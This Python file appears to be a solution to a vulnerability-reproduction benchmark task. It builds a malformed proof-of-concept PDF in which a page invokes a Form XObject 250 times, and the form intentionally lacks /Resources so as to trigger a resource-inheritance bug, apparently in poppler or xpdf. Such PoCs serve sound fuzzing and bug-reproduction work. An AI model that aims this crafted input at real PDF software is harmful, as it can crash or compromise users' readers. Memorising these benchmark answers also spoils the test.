import io
import os
import re
import tarfile
import zipfile
from typing import Dict, List, Optional


def _iter_archive_names(src_path: str, limit: int = 20000) -> List[str]:
    names: List[str] = []
    try:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    names.append(m.name)
                    if len(names) >= limit:
                        break
        elif zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path) as zf:
                for n in zf.namelist():
                    names.append(n)
                    if len(names) >= limit:
                        break
    except Exception:
        pass
    return names


def _guess_is_pdf_project(src_path: str) -> bool:
    names = _iter_archive_names(src_path)
    if not names:
        return True
    hit = 0
    for n in names:
        ln = n.lower()
        if any(k in ln for k in ("pdfdoc", "xref", "catalog", "poppler", "xpdf", "pdfto", "pdftoppm", "pdftotext", "pdfinfo", "splash", "gfx", "fofi")):
            hit += 1
        if any(ln.endswith(ext) for ext in (".pdf", ".ttf", ".otf")):
            hit += 1
        if hit >= 3:
            return True
    return False


def _pdf_stream_obj(dict_entries: bytes, stream_data: bytes) -> bytes:
    # Length is exact bytes between stream\n and \nendstream (inclusive of the trailing newline we include below).
    if not stream_data.endswith(b"\n"):
        stream_data += b"\n"
    length = len(stream_data)
    return b"<< " + dict_entries + b" /Length " + str(length).encode("ascii") + b" >>\nstream\n" + stream_data + b"endstream"


def _build_pdf(objects: Dict[int, bytes], root_obj: int) -> bytes:
    max_obj = max(objects.keys()) if objects else 1
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    out = bytearray(header)
    offsets = [0] * (max_obj + 1)

    for i in range(1, max_obj + 1):
        offsets[i] = len(out)
        body = objects.get(i, b"<<>>")
        if not body.endswith(b"\n"):
            body += b"\n"
        out += str(i).encode("ascii") + b" 0 obj\n"
        out += body
        out += b"endobj\n"

    xref_pos = len(out)
    out += b"xref\n"
    out += b"0 " + str(max_obj + 1).encode("ascii") + b"\n"
    out += b"0000000000 65535 f \n"
    for i in range(1, max_obj + 1):
        out += ("%010d 00000 n \n" % offsets[i]).encode("ascii")

    trailer = b"<< /Size " + str(max_obj + 1).encode("ascii") + b" /Root " + str(root_obj).encode("ascii") + b" 0 R >>"
    out += b"trailer\n" + trailer + b"\n"
    out += b"startxref\n" + str(xref_pos).encode("ascii") + b"\n%%EOF\n"
    return bytes(out)


def _make_poc_pdf(repeat_do: int = 250) -> bytes:
    # Page resources are a direct dictionary (not an indirect object).
    # Form XObject intentionally omits /Resources to encourage inherited resources usage.
    do_seq = (b"/X1 Do\n" * repeat_do)
    contents = b"q\n" + do_seq + b"Q\n"

    form_stream = b"q\n0 0 10 10 re\nf\nQ\n"

    objects: Dict[int, bytes] = {}

    objects[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

    # Page object with direct /Resources dict
    objects[3] = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200]\n"
        b"   /Resources << /XObject << /X1 6 0 R >> >>\n"
        b"   /Contents 4 0 R\n"
        b">>"
    )

    objects[4] = _pdf_stream_obj(b"", contents)

    # Unused placeholder to keep numbering simple if needed
    objects[5] = b"<<>>"

    objects[6] = _pdf_stream_obj(
        b"/Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Matrix [1 0 0 1 0 0]",
        form_stream,
    )

    return _build_pdf(objects, root_obj=1)


class Solution:
    def solve(self, src_path: str) -> bytes:
        if _guess_is_pdf_project(src_path):
            return _make_poc_pdf(repeat_do=250)
        return _make_poc_pdf(repeat_do=250)